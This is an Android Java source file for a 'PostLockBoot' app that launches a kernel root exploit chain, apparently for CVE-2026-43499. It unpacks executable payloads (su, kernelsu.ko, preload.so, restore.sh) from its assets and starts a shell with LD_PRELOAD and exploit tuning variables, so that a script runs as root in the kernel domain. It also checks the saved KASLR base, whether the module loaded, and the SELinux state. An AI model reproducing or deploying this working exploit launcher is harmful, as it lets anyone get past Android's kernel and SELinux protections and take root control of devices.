package com.postlock.boot;

import android.content.Context;
import android.content.res.AssetManager;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

/**
 * Shared payload + trigger logic for PostLockBoot (used by both
 * BootReceiver and the MainActivity status panel).
 */
public final class PostLock {

    public static final String TAG = "PostLockBoot";
    // bump when any asset payload changes -> re-extract on next use
    public static final String PAYLOAD_VERSION = "v1-20261019";
    static final String[] PAYLOAD = {
            "preload.so", "su", "kernelsu.ko", "finitmod", "ocsk.ko", "restore.sh",
    };

    private PostLock() {
    }

    /** Extract assets (version-gated) into the app-private postlock dir. */
    public static File ensurePayload(Context context) throws Exception {
        File dir = new File(context.getFilesDir(), "postlock");
        File ver = new File(dir, ".ver");
        File restore = new File(dir, "restore.sh");
        if (ver.isFile() && PAYLOAD_VERSION.equals(readAllText(ver)) && restore.isFile()) {
            return dir;
        }
        if (!dir.isDirectory() && !dir.mkdirs()) {
            throw new java.io.IOException("cannot create " + dir);
        }
        AssetManager am = context.getAssets();
        for (String name : PAYLOAD) {
            File out = new File(dir, name);
            try (InputStream in = am.open("postlock/" + name);
                 OutputStream os = new FileOutputStream(out)) {
                byte[] buf = new byte[65536];
                int n;
                while ((n = in.read(buf)) > 0) {
                    os.write(buf, 0, n);
                }
            }
            // exec bit matters: the chain gates finitmod/su on X_OK
            if (!out.setExecutable(true, false)) {
                Log.w(TAG, "setExecutable failed for " + name);
            }
        }
        try (FileOutputStream os = new FileOutputStream(ver)) {
            os.write(PAYLOAD_VERSION.getBytes());
        }
        return dir;
    }

    /**
     * App-uid rounds can NOT run the slide route: perf_event_open (the
     * KASLR watchpoint oracle) is denied to untrusted_app by SELinux, so a
     * first run on a fresh boot always fails -- and the chain's failure
     * path ends in a watchdog reboot (main.c:131), which re-triggers this
     * receiver: an infinite panic loop (observed 2026-10-19, boot
     * f2683be0 -> 04714138 -> 067d3efd).  The design (main.c:236) is that
     * a shell/root round of the SAME boot persists kaslr_base via
     * ks_persist_kaslr_file(); only then can an app round take the
     * verified FOPS path.  Gate dispatch on that file + boot_id match.
     */
    public static boolean readyToTrigger() {
        String text = readSmallFile("/data/local/tmp/ksu_kaslr");
        if (text == null || !text.startsWith("kaslr boot=")) {
            return false;
        }
        String fileBoot = text.substring("kaslr boot=".length()).split("[ \\n]")[0];
        String nowBoot = readSmallFile("/proc/sys/kernel/random/boot_id");
        if (nowBoot == null) {
            return false;
        }
        return fileBoot.equals(nowBoot.trim());
    }

    private static String readSmallFile(String path) {
        try (FileInputStream in = new FileInputStream(path)) {
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buf = new byte[256];
            int n;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
            }
            return out.toString("UTF-8");
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Dispatch the exploit chain: the preload constructor runs the whole
     * exploit synchronously inside the child /system/bin/sh; its
     * KS_COLDSTART fork then runs restore.sh as uid0 kernel domain.
     * Fire-and-forget -- returns immediately.
     */
    public static void triggerChain(Context context) throws Exception {
        File dir = ensurePayload(context);
        String ps = dir.getAbsolutePath();
        // Env aligned with the proven tools/postlock.sh TRIGGER_ENV from
        // the CVE-2026-43499 repo.  KSUD_DST sits directly under
        // /data/local/tmp: this app cannot mkdir ksu_boot there
        // (shell_data_file), and the write itself happens after escalation
        // (kernel domain).  /system/bin/sh, NOT toybox sh: toybox here has
        // no sh builtin.
        String cmdline = "LD_PRELOAD=" + ps + "/preload.so "
                + "KS_LOG_SYNC=1 KS_PSELECT_BSS_LOCK=1 KS_CFGFS_LOG=1 "
                + "KS_PAYLOAD_SCAN=1 KSNITCH_VERBOSE=1 "
                + "KS_RECLAIM_DETERMINISTIC=1 KS_PSELECT_FOPS_VOFF=1 "
                + "KSUD_DST=/data/local/tmp/ksud KSUD_NO_PARENT_INSTALL=1 SU_INSTALL=0 "
                + "KS_COLDSTART=" + ps + "/restore.sh "
                + "KS_FINITMOD=" + ps + "/finitmod KS_KO=" + ps + "/kernelsu.ko "
                + "KS_PIPE_SLABS=15 KS_PAYLOAD_BASE_FILE=/data/local/tmp/skbdelta "
                + "/system/bin/sh -c echo_CHAIN_EXIT_DONE";
        ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", "-c", cmdline)
                .redirectOutput(ProcessBuilder.Redirect.to(new File(dir, "chain.log")))
                .redirectErrorStream(true);
        pb.start();
        Log.i(TAG, "chain dispatched, payload " + PAYLOAD_VERSION);
    }

    /** True when the named module appears in /proc/modules. */
    public static boolean moduleLoaded(String name) {
        try (FileInputStream in = new FileInputStream("/proc/modules");
             ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
            }
            for (String line : out.toString("UTF-8").split("\n")) {
                if (line.startsWith(name + " ")) {
                    return true;
                }
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    /** SELinux enforcing flag: true = Enforcing. */
    public static boolean selinuxEnforcing() {
        try (FileInputStream in = new FileInputStream("/sys/fs/selinux/enforce")) {
            return in.read() == '1';
        } catch (Exception ignored) {
            return true; // fail safe: assume enforcing
        }
    }

    /** Last modified of the chain log, or 0 if never run. */
    public static long chainLogMtime(Context context) {
        File f = new File(new File(context.getFilesDir(), "postlock"), "chain.log");
        return f.isFile() ? f.lastModified() : 0;
    }

    /** Tail of the chain log as a String ("" when absent). */
    public static String chainLogTail(Context context, int maxBytes) {
        File f = new File(new File(context.getFilesDir(), "postlock"), "chain.log");
        if (!f.isFile()) {
            return "";
        }
        try (FileInputStream in = new FileInputStream(f)) {
            long len = in.getChannel().size();
            if (len > maxBytes) {
                long skipped = in.skip(len - maxBytes);
                if (skipped < len - maxBytes) {
                    return "";
                }
            }
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
            }
            // strip ANSI color escapes -- they render as garbage boxes
            return out.toString("UTF-8")
                    .replaceAll("\u001b\\[[0-9;]*[A-Za-z]", "");
        } catch (Exception e) {
            return "<log unreadable: " + e + ">";
        }
    }

    static String readAllText(File f) throws Exception {
        try (FileInputStream in = new FileInputStream(f);
             ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            byte[] buf = new byte[256];
            int n;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
            }
            return out.toString("UTF-8");
        }
    }
}
